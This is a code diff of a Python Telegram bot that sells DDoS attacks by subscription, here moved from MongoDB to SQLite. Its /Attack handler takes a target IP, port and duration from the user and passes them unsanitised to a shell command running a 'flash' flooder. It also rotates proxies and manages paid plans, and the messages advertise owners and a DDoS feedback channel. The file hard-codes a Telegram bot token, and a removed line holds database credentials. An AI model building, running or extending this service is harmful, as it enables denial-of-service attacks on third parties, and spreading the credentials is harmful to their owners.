@@ -4,39 +4,75 @@ import json
 import requests
 import logging
 import time
-from pymongo import MongoClient
-from datetime import datetime, timedelta
-import certifi
 import random
-from subprocess import Popen
-from threading import Thread
+import sqlite3
 import asyncio
 import aiohttp
+from datetime import datetime, timedelta
+from subprocess import Popen
+from threading import Thread
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
-loop = asyncio.get_event_loop()
+# --- Database Setup (SQLite) ---
+conn = sqlite3.connect('users.db', check_same_thread=False)
+cursor = conn.cursor()
 
+cursor.execute('''
+CREATE TABLE IF NOT EXISTS users (
+    user_id INTEGER PRIMARY KEY,
+    plan INTEGER,
+    valid_until TEXT,
+    access_count INTEGER
+)
+''')
+conn.commit()
+
+def get_user(user_id):
+    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
+    return cursor.fetchone()
+
+def update_user(user_id, plan, valid_until):
+    cursor.execute("""
+        INSERT INTO users (user_id, plan, valid_until, access_count)
+        VALUES (?, ?, ?, 0)
+        ON CONFLICT(user_id) DO UPDATE SET
+        plan=excluded.plan,
+        valid_until=excluded.valid_until
+    """, (user_id, plan, valid_until))
+    conn.commit()
+
+def count_plan(plan):
+    cursor.execute("SELECT COUNT(*) FROM users WHERE plan=?", (plan,))
+    result = cursor.fetchone()
+    return result[0] if result else 0
+
+# --- Bot Configuration ---
 TOKEN = '8653426400:AAHbsHrOwq3u9vHMiZfjrtwTDZqg37-_ERU'
-MONGO_URI = 'mongodb+srv://patelji:pateljii@cluster0.f2bdi.mongodb.net/patelji?retryWrites=true&w=majority&appName=Cluster0'
-FORWARD_CHANNEL_ID = -1003587720306
-CHANNEL_ID = -1003587720306
-error_channel_id = -1003587720306
+FORWARD_CHANNEL_ID = -4515259640
+CHANNEL_ID = -4515259640
+error_channel_id = -4515259640
+REQUEST_INTERVAL = 1
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-
-client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['patelji']
-users_collection = db.users
-
 bot = telebot.TeleBot(TOKEN)
-REQUEST_INTERVAL = 1
 
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list
+# --- Asyncio Setup ---
+loop = asyncio.new_event_loop()
 
-async def start_asyncio_thread():
+async def start_asyncio_loop():
+    while True:
+        await asyncio.sleep(REQUEST_INTERVAL)
+
+async def run_attack_command_async(target_ip, target_port, duration):
+    process = await asyncio.create_subprocess_shell(f"./flash {target_ip} {target_port} {duration}")
+    await process.communicate()
+
+def start_asyncio_thread():
     asyncio.set_event_loop(loop)
-    await start_asyncio_loop()
+    loop.run_until_complete(start_asyncio_loop())
 
+# --- Proxy Management ---
 def update_proxy():
     proxy_list = [
         "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
@@ -72,25 +108,19 @@ def update_proxy():
 
 @bot.message_handler(commands=['update_proxy'])
 def update_proxy_command(message):
-    chat_id = message.chat.id
     try:
         update_proxy()
-        bot.send_message(chat_id, "Proxy updated successfully.")
+        bot.send_message(message.chat.id, "Proxy updated successfully.")
     except Exception as e:
-        bot.send_message(chat_id, f"Failed to update proxy: {e}")
+        bot.send_message(message.chat.id, f"Failed to update proxy: {e}")
 
-async def start_asyncio_loop():
-    while True:
-        await asyncio.sleep(REQUEST_INTERVAL)
-
-async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./flash {target_ip} {target_port} {duration}")
-    await process.communicate()
-
+# --- Admin Logic ---
 def is_user_admin(user_id, chat_id):
     try:
-        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
-    except:
+        status = bot.get_chat_member(chat_id, user_id).status
+        return status in ['administrator', 'creator']
+    except Exception as e:
+        logging.error(f"Admin check failed: {e}")
         return False
 
 @bot.message_handler(commands=['approve', 'disapprove'])
@@ -114,72 +144,42 @@ def approve_or_disapprove_user(message):
     days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
 
     if action == '/approve':
-        if plan == 1:  # Instant Plan 🧡
-            if users_collection.count_documents({"plan": 1}) >= 99:
+        if plan == 1:
+            if count_plan(1) >= 99:
                 bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                 return
-        elif plan == 2:  # Instant++ Plan 💥
-            if users_collection.count_documents({"plan": 2}) >= 499:
+        elif plan == 2:
+            if count_plan(2) >= 499:
                 bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                 return
 
         valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
-            upsert=True
-        )
+        update_user(target_user_id, plan, valid_until)
         msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
-    else:  # disapprove
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
-            upsert=True
-        )
+    else:
+        update_user(target_user_id, 0, "")
         msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
 
     bot.send_message(chat_id, msg_text, parse_mode='Markdown')
     bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
+
+# --- Attack Logic ---
 @bot.message_handler(commands=['Attack'])
 def attack_command(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
 
     try:
-        user_data = users_collection.find_one({"user_id": user_id})
-        if not user_data or user_data['plan'] == 0:
-            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the ADMIN -: @rasharking.")
-            return
-
-        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
-            bot.send_message(chat_id, "Your Instant Plan 🧡 is currently not available due to limit reached.")
-            return
-
-        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
-            bot.send_message(chat_id, "Your Instant++ Plan 💥 is currently not available due to limit reached.")
-            return
-
-        bot.send_message(chat_id, "Enter the target IP, port, and duration (in seconds) separated by spaces Owner -: @FLASH_502 Owner 2 -: @@Rasharking Dm to buy -: @FLASH_502 Feedback channel -: https://t.me/FLASHddosFEEDBACK .")
-        bot.register_next_step_handler(message, process_attack_command)
-    except Exception as e:
-        logging.error(f"Error in attack command: {e}")
-
-@bot.message_handler(commands=['Attack'])
-def attack_command(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-
-    try:
-        user_data = users_collection.find_one({"user_id": user_id})
-        if not user_data or user_data['plan'] == 0:
+        user_data = get_user(user_id)
+        if not user_data or user_data[1] == 0:
             bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator ADMIN -: @Richyst.*", parse_mode='Markdown')
             return
 
-        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
+        if user_data[1] == 1 and count_plan(1) > 99:
             bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
             return
 
-        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
+        if user_data[1] == 2 and count_plan(2) > 499:
             bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
             return
 
@@ -205,26 +205,16 @@ def process_attack_command(message):
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
 
-def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(start_asyncio_loop())
-
+# --- General Handlers ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    # Create a markup object
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-
-    # Create buttons
-   # btn1 = KeyboardButton("Instant Plan 🧡")
     btn2 = KeyboardButton("flash")
     btn3 = KeyboardButton("Canary Download✔️")
     btn4 = KeyboardButton("My Account🏦")
     btn5 = KeyboardButton("Help❓")
     btn6 = KeyboardButton("Contact admin✔️")
-
-    # Add buttons to the markup
     markup.add(btn2, btn6)
-
     bot.send_message(message.chat.id, "*Choose an option AUR AGAR BUY NHI KIYA HAI TO BUY KAR AUR ADMIN KO BOL APPROVE KARNE KO ADMIN -: @Richyst:*", reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(func=lambda message: True)
@@ -238,11 +228,11 @@ def handle_message(message):
         bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/flashmainchannel/50*", parse_mode='Markdown')
     elif message.text == "My Account🏦":
         user_id = message.from_user.id
-        user_data = users_collection.find_one({"user_id": user_id})
+        user_data = get_user(user_id)
         if user_data:
             username = message.from_user.username
-            plan = user_data.get('plan', 'N/A')
-            valid_until = user_data.get('valid_until', 'N/A')
+            plan = user_data[1]
+            valid_until = user_data[2]
             current_time = datetime.now().isoformat()
             response = (f"*USERNAME: {username}\n"
                         f"Plan: {plan}\n"
@@ -267,5 +257,4 @@ if __name__ == "__main__":
             bot.polling(none_stop=True)
         except Exception as e:
             logging.error(f"An error occurred while polling: {e}")
-        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
         time.sleep(REQUEST_INTERVAL)
